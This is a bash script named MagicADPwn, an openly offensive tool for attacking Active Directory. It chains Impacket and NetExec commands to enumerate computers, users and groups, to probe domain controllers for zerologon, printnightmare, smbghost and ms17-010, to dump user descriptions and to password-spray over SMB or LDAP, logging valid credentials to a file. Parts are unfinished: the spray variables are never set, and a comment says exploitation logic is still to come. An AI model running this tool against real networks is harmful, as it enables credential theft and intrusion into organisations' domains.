#!/usr/bin/env bash

# MagicADPwn - Automated Active Directory enumeration and exploitation tool

# Define directories
BASE_DIR="$HOME/.magicadpwn"
LOG_DIR="$BASE_DIR/logs"
REPORT_DIR="$BASE_DIR/reports"

# Function to ensure a directory exists
ensure_dir_exists() {
  local dir="$1"
  if [[ ! -d "$dir" ]]; then
    mkdir -p "$dir" || {
      echo "[ERROR] Failed to create directory: $dir. Check permissions."
      exit 1
    }
  fi
}

# Ensure necessary directories exist
ensure_dir_exists "$BASE_DIR"
ensure_dir_exists "$LOG_DIR"
ensure_dir_exists "$REPORT_DIR"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Display banner
echo -e "${BLUE}==============================${RESET}"
echo -e "${GREEN}       MagicADPwn v1.0       ${RESET}"
echo -e "${BLUE}==============================${RESET}"

# Usage function
usage() {
  echo "MagicADPwn - Automated AD Enumeration & Exploitation"
  echo ""
  echo "Usage: $0 -t <target_ip/hostname> [-u <username>] [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v]"
  echo ""
  echo "Required:"
  echo "  -t, --target       Target Domain Controller IP/hostname"
  echo ""
  echo "Optional:"
  echo "  -u, --user         Username (default: guest/anonymous)"
  echo "  -p, --pass         Password"
  echo "  -H, --hash         NTLM hash"
  echo "  -k, --kerberos     Use Kerberos authentication"
  echo "      --no-pass      Skip password/hash when using Kerberos"
  echo "      --local-auth   Use local authentication"
  echo "  --no-recon         Skip reconnaissance phase"
  echo "  --report <format>  Generate report (json, csv, markdown, html)"
  echo "  -v, --verbose      Enable verbose output"
  echo ""
  exit 0
}

# Ensure arguments are provided
if [[ "$#" -eq 0 ]]; then
  usage
fi

# Parse command-line arguments
TARGET=""
USERNAME=""
PASSWORD=""
NTLM_HASH=""
KERBEROS=false
NO_PASS=false
LOCAL_AUTH=false
NO_RECON=false
REPORT_FORMAT=""
VERBOSE=false

while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -t|--target)
      TARGET="$2"
      shift 2
      ;;
    -u|--user)
      USERNAME="$2"
      shift 2
      ;;
    -p|--pass)
      PASSWORD="$2"
      shift 2
      ;;
    -H|--hash)
      NTLM_HASH="$2"
      shift 2
      ;;
    -k|--kerberos)
      KERBEROS=true
      shift
      ;;
    --no-pass)
      NO_PASS=true
      shift
      ;;
    --local-auth)
      LOCAL_AUTH=true
      shift
      ;;
    --no-recon)
      NO_RECON=true
      shift
      ;;
    --report)
      REPORT_FORMAT="$2"
      shift 2
      ;;
    -v|--verbose)
      VERBOSE=true
      shift
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo -e "${RED}[ERROR]${RESET} Unknown option: $1"
      usage
      ;;
  esac
done

# Ensure a target is provided
if [[ -z "$TARGET" ]]; then
  echo -e "${RED}[ERROR]${RESET} Target (-t) is required."
  usage
  exit 1
fi

# Default to guest/anonymous authentication if no credentials are provided
if [[ -z "$USERNAME" ]]; then
  echo "No username provided, attempting guest/anonymous authentication."
  USERNAME="guest"
fi

# Function to check if a port is open
check_port() {
  local target="$1"
  local port="$2"
  timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && return 0 || return 1
}

# Function to retrieve a list of computers from Active Directory
enumerate_computers() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local kerberos="$5"
  
  echo -e "${GREEN}[INFO]${RESET} Enumerating computers on Active Directory..."
  
  local cmd="GetADComputers.py ${target}"
  
  if [[ -n "$user" ]]; then
    cmd+="/${user}"
  fi
  if [[ -n "$pass" ]]; then
    cmd+=":${pass}"
  fi
  if [[ -n "$hash" ]]; then
    cmd+=" -hashes $hash"
  fi
  if [[ "$kerberos" == "true" ]]; then
    cmd+=" -k"
  fi
  
  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
  eval "$cmd"
}

# Function to retrieve a list of users from Active Directory
enumerate_users() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local kerberos="$5"
  
  echo -e "${GREEN}[INFO]${RESET} Enumerating users on Active Directory..."
  
  local cmd="GetADUsers.py -all ${target}"
  
  if [[ -n "$user" ]]; then
    cmd+="/${user}"
  fi
  if [[ -n "$pass" ]]; then
    cmd+=":${pass}"
  fi
  if [[ -n "$hash" ]]; then
    cmd+=" -hashes $hash"
  fi
  if [[ "$kerberos" == "true" ]]; then
    cmd+=" -k"
  fi
  
  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
  eval "$cmd" | grep -vE '^(Impacket|\[\*|Name|-------------------)' | awk 'NF {print $1}' | sed '/^$/d' > "$BASE_DIR/users.txt"
  echo -e "${GREEN}[INFO]${RESET} User list saved to $BASE_DIR/users.txt"
}

# Function to enumerate groups from Active Directory
enumerate_groups() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local groups_file="$BASE_DIR/groups.txt"
  
  echo -e "${GREEN}[INFO]${RESET} Enumerating groups on Active Directory..."
  
  local cmd="nxc smb "$target" --groups"
  
  if [[ -n "$user" ]]; then
    cmd+=" -u \"$user\""
  fi
  if [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  if [[ -n "$hash" ]]; then
    cmd+=" -H \"$hash\""
  fi
  
  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
  eval "$cmd" | tee "$groups_file"
  echo -e "${GREEN}[INFO]${RESET} Group enumeration results saved to $groups_file"
}

# Function for password spraying
password_spray() {
  local target="$1"
  local users="$2"
  local passwords="$3"
  local creds_file="$BASE_DIR/creds.txt"
  
  echo -e "${GREEN}[INFO]${RESET} Checking available authentication services on $target..."
  
  if check_port "$target" 445; then
    echo -e "${GREEN}[INFO]${RESET} SMB (port 445) is open. Using SMB for authentication attempts."
    if [[ -n "$users" && -n "$passwords" ]]; then
      nxc smb "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    elif [[ -n "$users" ]]; then
      nxc smb "$target" -u "$users" -p "$PASSWORD" --continue-on-success | grep [+] | tee -a "$creds_file"
    elif [[ -n "$passwords" ]]; then
      nxc smb "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    fi
  elif check_port "$target" 389; then
    echo -e "${GREEN}[INFO]${RESET} LDAP (port 389) is open. Using LDAP for authentication attempts."
    if [[ -n "$users" && -n "$passwords" ]]; then
      nxc ldap "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    elif [[ -n "$users" ]]; then
      nxc ldap "$target" -u "$users" -p "$PASSWORD" --continue-on-success | grep [+] | tee -a "$creds_file"
    elif [[ -n "$passwords" ]]; then
      nxc ldap "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    fi
  else
    echo -e "${RED}[ERROR]${RESET} Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
    return 1
  fi
}

# Function to scan for known vulnerabilities
scan_vulnerabilities() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local vuln_file="$BASE_DIR/vulnerabilities.txt"

  echo -e "${GREEN}[INFO]${RESET} Scanning for known vulnerabilities on $target..."

  local cmd="nxc smb \"$target\" -M zerologon -M printnightmare -M smbghost -M ms17-010"

  if [[ -n "$user" ]]; then
    cmd+=" -u \"$user\""
  fi
  if [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  if [[ -n "$hash" ]]; then
    cmd+=" -H \"$hash\""
  fi

  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
  eval "$cmd" | tee "$vuln_file"
  echo -e "${GREEN}[INFO]${RESET} Vulnerability scan results saved to $vuln_file"
}

# Function to dump user descriptions from Active Directory
dump_user_descriptions() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local desc_file="$BASE_DIR/user_descriptions.txt"
  
  echo -e "${GREEN}[INFO]${RESET} Dumping user descriptions from Active Directory..."
  
  local cmd="nxc ldap \"$target\" -M get-desc-users"

  if [[ -n "$user" ]]; then
    cmd+=" -u \"$user\""
  fi
  if [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  if [[ -n "$hash" ]]; then
    cmd+=" -H \"$hash\""
  fi

  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
  eval "$cmd" | tee "$desc_file"
  echo -e "${GREEN}[INFO]${RESET} User descriptions saved to $desc_file"
}

# Ensure a target is provided
if [[ -z "$TARGET" ]]; then
  echo -e "${RED}[ERROR]${RESET} Target (-t) is required."
  usage
  exit 1
fi

# Placeholder for main execution logic
echo "Starting MagicADPwn on $TARGET"

# Enumerate computers from Active Directory
enumerate_computers "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"

# Enumerate users from Active Directory
enumerate_users "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"

# Enumerate groups from Active Directory
enumerate_groups "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"

# Scan for known vulnerabilities using provided credentials
scan_vulnerabilities "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"

# Dump user descriptions from Active Directory
dump_user_descriptions "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"

# Determine authentication mode
if [[ -n "$SPRAY_USERS" || -n "$SPRAY_PASSWORDS" ]]; then
  password_spray "$TARGET" "$SPRAY_USERS" "$SPRAY_PASSWORDS"
  exit 0
fi

# Additional enumeration and exploitation logic will be added here
